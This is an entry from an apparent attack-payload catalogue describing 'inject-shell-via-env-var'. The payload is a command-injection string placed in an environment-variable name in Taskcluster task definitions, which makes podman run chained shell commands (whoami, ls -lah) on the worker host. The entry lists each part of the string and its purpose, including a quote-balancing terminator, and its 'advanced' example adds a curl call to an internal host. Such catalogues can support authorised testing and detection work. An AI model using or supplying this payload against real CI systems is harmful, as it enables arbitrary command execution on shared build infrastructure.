---
data: 'test2 --help ; whoami ; ls -lah ;:''--help'''
tags:
  - rce
  - injection
type: command
output: 'Output includes command help, current user (e.g., root), and directory listing'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:53.981Z'
id: 36e7711d-0e23-4294-9f3b-93e48be87282
verified: false
validated: true
submitted: true
---
# inject-shell-via-env-var

## Command

```bash
test2 --help ; whoami ; ls -lah ;:'--help'
```

## Description

This payload is injected as an environment variable name in Taskcluster task definitions, exploiting lack of sanitization in podman run command construction to execute arbitrary shell commands on the worker host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `test2 --help` | Initial harmless command to trigger parsing | Yes |
| `; whoami` | Chain to display current host user | Yes |
| `; ls -lah` | Chain to list host directory contents | Yes |
| `;:'--help'` | Terminator to balance quotes and avoid podman syntax errors | Yes |

## Examples

### Basic Usage

Used directly as env name: "test2 --help ; whoami ; ls -lah ;:'--help'"

### Advanced Usage

Extend with more commands: "test2 --help ; whoami ; ls -lah ; curl http://internal ;:'--help'"

## Expected Output

Shell execution on host: help text for 'test2', username (e.g., 'root'), long listing of current directory with hidden files and sizes. Visible in Taskcluster logs.

## Related

- [[Related Procedure: Submit-Malicious-Task-Definition]]
